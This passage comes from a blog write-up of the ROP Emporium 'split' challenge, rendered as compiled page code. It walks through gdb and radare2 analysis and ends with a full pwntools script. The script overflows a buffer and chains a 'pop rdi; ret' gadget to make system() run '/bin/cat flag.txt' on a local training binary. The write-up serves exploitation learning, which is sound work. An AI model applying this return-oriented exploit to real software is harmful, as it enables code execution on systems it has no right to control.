\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400743\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400746\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40084a\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040074b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"9\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400560\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"system@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400750\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tnop\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400751\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"15\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tpop    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400752\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"16\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tret\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"(gdb) x\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\"s \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40084a\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40084a\"}),\":\t\",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/bin/ls\"'}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb)\n`})]})}),(0,e.jsxs)(n.p,{children:[\"Goal is to pass a different string to the system function instead of \",(0,e.jsx)(n.strong,{children:'\"/bin/ls\"'})]}),(0,e.jsx)(n.p,{children:\"From the authors hint, we can look for useful hints in the binary using either radare2 or rizin. Both tools perform the same function, it is a matter of choice.\"}),(0,e.jsx)(n.blockquote,{children:(0,e.jsxs)(n.p,{children:[\"Now that you've gathered the elements of your exploit you can start to piece them together, you want to call system() with the \",(0,e.jsx)(n.strong,{children:'\"/bin/cat flag.txt\"'}),\" string as the only argument. You'll also have to start dealing with the differences between the various architectures' calling conventions.\"]})}),(0,e.jsxs)(n.p,{children:[\"Opening the binary in radare2, we can use \",(0,e.jsx)(n.strong,{children:\"iz\"}),\" command to look for strings. The goal is to read the flag from the system.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-nasm\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x004005b0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),` iz\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`nth paddr      vaddr      len size section type  string\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000007e8\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x004007e8\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"21\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"22\"}),`   .rodata ascii split by ROP Emporium\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000007fe\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x004007fe\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"7\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`    .rodata ascii x86_64\\\\n\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000806\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400806\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"9\"}),`    .rodata ascii \\\\nExiting\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000810\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400810\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"43\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"44\"}),`   .rodata ascii Contriving a reason to ask user for data...\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000083f\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0040083f\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"11\"}),\"   .rodata ascii Thank you\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000084a\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0040084a\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"7\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"    .rodata ascii \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\"bin\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),`ls\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00001060\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00601060\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"17\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"18\"}),\"   .data   ascii \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\"bin\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),`cat flag.txt\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`})]})}),(0,e.jsxs)(n.p,{children:[\"We have an important string \",(0,e.jsx)(n.strong,{children:'\"/bin/cat flag.txt\"'}),\" which will enable us to complete our goal. Now we need pass the string to system function as follows \",(0,e.jsx)(n.strong,{children:\"system('/bin/cat flag.txt')\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"For building ropchain, we need to understand the calling conventions of \",(0,e.jsx)(n.strong,{children:\"AMD64 ABI\"}),\".The calling convention passes the arguments to the registers in the following order \",(0,e.jsx)(n.strong,{children:\"RDI, RSI, RDX, RCX, R8 and R9\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"Because the system function receives one argument, we need to look for one gadgets that we control the \",(0,e.jsx)(n.strong,{children:\"rdi\"}),\" address.\"]}),(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.strong,{children:\"What are gadgets?\"}),\" Gadgets are sequence of instructions the end with ret instruction. Because we want to load a value into rdi register, we look for a pop \",(0,e.jsx)(n.strong,{children:\"pop rdi; ret\"}),\" instruction in order to pass an argument to the system function.\"]}),(0,e.jsxs)(n.p,{children:[\"For searching gadget in radare2/rizin, use \",(0,e.jsx)(n.strong,{children:\"/R\"}),\" command as shown in the image below.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"\",src:\"/static/images/ropemporium/split_poprdi.png\",width:\"726\",height:\"95\"})}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"ropchain\",src:\"/static/images/ropemporium/popgadget.png\",width:\"211\",height:\"366\"})}),(0,e.jsxs)(n.p,{children:[\"The goal is to overwrite the return address with the address of \",(0,e.jsx)(n.strong,{children:'\"pop rdi, ret \"'}),\" and then call system function. we need to fill the buffer memory with 32bytes, 8 bytes more to overwrite the rbp address and 8 bytes teo overwrite the return address with pop rdi address.\"]}),(0,e.jsxs)(n.h2,{id:\"exploit\",children:[(0,e.jsx)(n.a,{href:\"#exploit\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploit\"]}),(0,e.jsx)(n.p,{children:\"Full exploit of split challenge is;\"}),(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-python\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` pwn\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encoding \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"latin-1\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"warnings\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"simplefilter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"ignore\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"arch \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"amd64\"'}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"io \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"process\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"./split\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"system_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400560\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#address of system\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pop_rdi_ret \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x004007c3\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# pop rdi; ret gadget\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"bin_cat_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00601060\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#bin cat flag.txt address\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"A\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#fill the buffer\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"B\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# overwrite  rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" pop_rdi_ret \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# pop rdi gadget\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" bin_cat_addr \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# argument passed to the system function\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" system_addr   \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#call system\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"io\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"writeafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'\u003e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"io\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"clean\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsx)(n.p,{children:\"Running the above code we get a flag.\"}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"\",src:\"/static/images/ropemporium/split_flag.png\",width:\"755\",height:\"95\"})}),(0,e.jsx)(n.blockquote,{children:(0,e.jsx)(n.p,{children:(0,e.jsx)(n.strong,{children:\"To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.\"})})})]})}}var w=x;function v(a,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return g(y);})();\n;return Component;","toc":[{"value":"Introduction","url":"#introduction","depth":2},{"value":"Exploit","url":"#exploit","depth":2}],"frontMatter":{"readingTime":{"text":"8 min read","minutes":7.645,"time":458700,"words":1529},"slug":"ropemporium-split","fileName":"ropemporium-split.mdx","title":"Return-Oriented Programming - Split","date":"2021-12-20","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain.","layout":"PostLayout","images":"/static/images/ropemporium/split.jpg","canonicalUrl":null}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.53,"time":31800,"words":106},"slug":["default"],"fileName":"default.md","name":"Thuri","avatar":"/static/images/profile.png","occupation":"Software Developer","email":"thuri783@gmail.com","github":"https://github.com/thuri10"}],"prev":{"title":"Return-Oriented Programming - Write4","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Find and manipulate gadgets to construct an arbitrary write primitive, then use it to learn where and how to get your data into process memory.","layout":"PostLayout","images":"/static/images/ropemporium/write4.jpg","canonicalUrl":null,"slug":"ropemporium-write4"},"next":{"title":"Return-Oriented Programming - ret2win","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"ret2win means return here to win and it's recommended you start with this challenge. Visit the challenge page by clicking this card to learn more.","images":"/static/images/ropemporium/ret2win.jpg","layout":"PostLayout","slug":"ropemporium-ret2win"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["ropemporium-split"]},"buildId":"cqLjL-8sxyQAjvkhbOEoE","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>